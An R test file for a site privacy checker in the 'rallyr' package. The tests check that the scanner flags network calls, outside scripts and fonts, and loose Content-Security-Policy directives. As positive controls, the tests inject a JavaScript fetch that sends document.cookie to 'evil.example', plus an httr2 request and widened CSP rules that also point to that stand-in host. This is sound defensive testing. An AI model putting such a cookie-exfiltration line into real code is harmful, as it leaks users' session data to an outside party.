# The privacy check (tools/check_site_privacy.R) must be able to go red.
# These tests run it on the assembled app, on a copy with a stray request put
# in on purpose, and on the same app again, so a green result means something.

tools_file <- function(name) test_path("..", "..", "tools", name)

load_checker <- function() {
  skip_if_not(file.exists(tools_file("check_site_privacy.R")), "tools/ is not part of the installed package")
  env <- new.env(parent = globalenv())
  sys.source(tools_file("app_sources.R"), envir = env)
  sys.source(tools_file("check_site_privacy.R"), envir = env)
  env
}

assemble_app <- function(dir) {
  skip_if_not(file.exists(tools_file("build_app.R")), "tools/ is not part of the installed package")
  out <- suppressWarnings(system2(
    file.path(R.home("bin"), "Rscript"),
    c(shQuote(normalizePath(tools_file("build_app.R"))), "--assemble-only", shQuote(paste0("--app-dir=", dir))),
    stdout = TRUE, stderr = TRUE
  ))
  expect_true(file.exists(file.path(dir, "app.R")), info = paste(out, collapse = "\n"))
  dir
}

navigation <- function(env) {
  defs <- env$app_collect_definitions(test_path("..", "..", "R"))
  api <- eval(parse(text = defs$sv_api_base$text))
  c(env$origin_of(api()), "https://github.com")
}

test_that("the checker's positive control fires for every rule and passes clean input", {
  env <- load_checker()
  expect_identical(env$check_site_privacy_selftest(), character(0))
})

test_that("the assembled app is clean; a stray fetch() makes the check fail; removing it makes it pass", {
  env <- load_checker()
  app <- assemble_app(withr::local_tempdir())
  nav <- navigation(env)

  green <- env$check_site_privacy(app, allowed_navigation = nav)
  expect_equal(nrow(green), 0L)
  expect_gt(attr(green, "n_files"), 1L)

  # RED: put a request to another site into the app on purpose
  code <- readLines(file.path(app, "app.R"))
  stray <- 'fetch("https://evil.example/collect?d=" + document.cookie);'
  writeLines(c(code, paste0('tick_script <- paste0(tick_script, "', gsub('"', '\\\\"', stray), '")')), file.path(app, "app.R"))
  red <- env$check_site_privacy(app, allowed_navigation = nav)
  expect_gt(nrow(red), 0L)
  expect_true("network-call" %in% red$rule)
  expect_true("unlisted-origin" %in% red$rule)
  expect_true(all(red$file == "app.R"))

  # GREEN again: restore the file
  writeLines(code, file.path(app, "app.R"))
  expect_equal(nrow(env$check_site_privacy(app, allowed_navigation = nav)), 0L)
})

test_that("network code smuggled into the bundled package code is caught too", {
  env <- load_checker()
  app <- assemble_app(withr::local_tempdir())
  nav <- navigation(env)
  p <- file.path(app, "pkg_R", "rallyr_app_sources.R")
  writeLines(c(readLines(p), 'leak <- function(x) httr2::req_perform(httr2::request("https://evil.example/x"))'), p)
  res <- env$check_site_privacy(app, allowed_navigation = nav)
  expect_true(any(res$rule == "network-call" & res$file == "pkg_R/rallyr_app_sources.R"))
})

test_that("the policy check: present and tight passes, missing or loose fails", {
  env <- load_checker()
  csp <- trimws(readLines(system.file("app", "csp.txt", package = "rallyr"), warn = FALSE))
  page <- function(content) {
    dir <- withr::local_tempdir(.local_envir = parent.frame())
    dir.create(file.path(dir, "app"))
    writeLines(sprintf('<html><head><meta http-equiv="Content-Security-Policy" content="%s"></head><body></body></html>', content),
               file.path(dir, "app", "index.html"))
    dir
  }
  expect_equal(nrow(env$check_site_privacy(page(csp), csp_dir = "app")), 0L)

  loose <- sub("connect-src 'self' blob: data:", "connect-src 'self' https://evil.example", csp, fixed = TRUE)
  expect_false(identical(loose, csp))
  res <- env$check_site_privacy(page(loose), csp_dir = "app")
  expect_true("csp-connect-src" %in% res$rule)

  wide <- sub("default-src 'self'", "default-src *", csp, fixed = TRUE)
  expect_true("csp-connect-src" %in% env$check_site_privacy(page(wide), csp_dir = "app")$rule)

  bare <- withr::local_tempdir()
  dir.create(file.path(bare, "app"))
  writeLines("<html><head></head></html>", file.path(bare, "app", "index.html"))
  expect_true("csp-missing" %in% env$check_site_privacy(bare, csp_dir = "app")$rule)
})

test_that("the committed policy keeps requests to this site, blobs and data URIs only", {
  csp <- trimws(readLines(system.file("app", "csp.txt", package = "rallyr"), warn = FALSE))
  skip_if(length(csp) == 0L || !nzchar(csp))
  directives <- trimws(strsplit(csp, ";", fixed = TRUE)[[1]])
  connect <- directives[startsWith(directives, "connect-src")]
  expect_identical(connect, "connect-src 'self' blob: data:")
  expect_true("default-src 'self'" %in% directives)
  expect_true("object-src 'none'" %in% directives)
  expect_false(grepl("https?:|\\*", csp))
})

test_that("a page that pulls a script or font from another site is flagged", {
  env <- load_checker()
  dir <- withr::local_tempdir()
  writeLines(c(
    "<html><head>",
    '<link rel="stylesheet" href="https://fonts.example/css?family=X">',
    '<link rel="canonical" href="https://johngavin.github.io/rallyr/">',
    '<script src="https://cdn.example/lib.js"></script>',
    "</head><body><a href=\"https://elsewhere.example\">a plain link</a></body></html>"
  ), file.path(dir, "index.html"))
  res <- env$check_site_privacy(dir)
  expect_equal(sum(res$rule == "external-resource"), 2L)   # the canonical link and the <a> are not requests
})

test_that("a folder with nothing to scan is reported as such, not as clean", {
  env <- load_checker()
  dir <- withr::local_tempdir()
  writeLines("x", file.path(dir, "notes.txt"))
  expect_equal(attr(env$check_site_privacy(dir), "n_files"), 0L)
})

test_that("every fetch directive of the policy is checked, not only connect-src", {
  env <- load_checker()
  csp <- trimws(readLines(system.file("app", "csp.txt", package = "rallyr"), warn = FALSE))
  page <- function(content) {
    dir <- withr::local_tempdir(.local_envir = parent.frame())
    dir.create(file.path(dir, "app"))
    writeLines(sprintf('<html><head><meta http-equiv="Content-Security-Policy" content="%s"></head></html>', content),
               file.path(dir, "app", "index.html"))
    dir
  }
  for (swap in list(
    c("script-src 'self'", "script-src 'self' https://evil.example"),
    c("worker-src 'self' blob:", "worker-src *"),
    c("img-src 'self' data: blob:", "img-src https:"),
    c("frame-src 'self' blob:", "frame-src evil.example")
  )) {
    loose <- sub(swap[1], swap[2], csp, fixed = TRUE)
    expect_false(identical(loose, csp), info = swap[1])
    expect_true("csp-fetch-src" %in% env$check_site_privacy(page(loose), csp_dir = "app")$rule, info = swap[2])
  }
})

test_that("a vendored file is skipped only at its own path, and R code that builds a request is caught", {
  env <- load_checker()
  dir <- withr::local_tempdir()
  dir.create(file.path(dir, "app"))
  writeLines("fetch('/search.json')", file.path(dir, "pkgdown.js"))
  writeLines("fetch('/search.json')", file.path(dir, "app", "pkgdown.js"))
  res <- env$check_site_privacy(dir)
  expect_identical(res$file, "app/pkgdown.js")
  for (code in c("library(httr2)", "con <- url(u)", "r <- request(u)", "x |> req_perform()")) {
    d <- withr::local_tempdir()
    writeLines(code, file.path(d, "x.R"))
    expect_true("network-call" %in% env$check_site_privacy(d)$rule, info = code)
  }
})
